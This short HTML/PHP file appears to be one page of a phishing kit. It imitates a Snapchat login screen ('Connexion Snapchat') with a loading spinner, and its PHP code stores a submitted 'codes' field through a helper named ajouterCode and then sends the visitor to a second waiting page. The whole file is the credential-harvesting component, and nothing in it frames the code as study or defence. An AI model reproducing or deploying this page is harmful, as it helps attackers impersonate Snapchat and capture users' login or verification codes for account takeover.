<!DOCTYPE html>
<html>

<head>
    <title>Connexion Snapchat</title>
    <link rel="stylesheet" type="text/css" href="style.css">
</head>

<body>
    <div class="container">

        <h2>Connexion</h2>
        <div class="loader"></div>


    </div>
</body>

</html>
<?php
require 'commande.php';
if (isset($_POST['envoyer'])) {
    if (!empty($_POST['codes'])) {
        $codes = htmlspecialchars(strip_tags($_POST['codes']));


        $user = ajouterCode($codes);

        if ($user) {
            // $_SESSION['userxXJppk45hPGu'] = $user;
            header('Location: attante2.php');
        } else {
            echo "<h1>pas de connection</h1>";
        }
    }
}
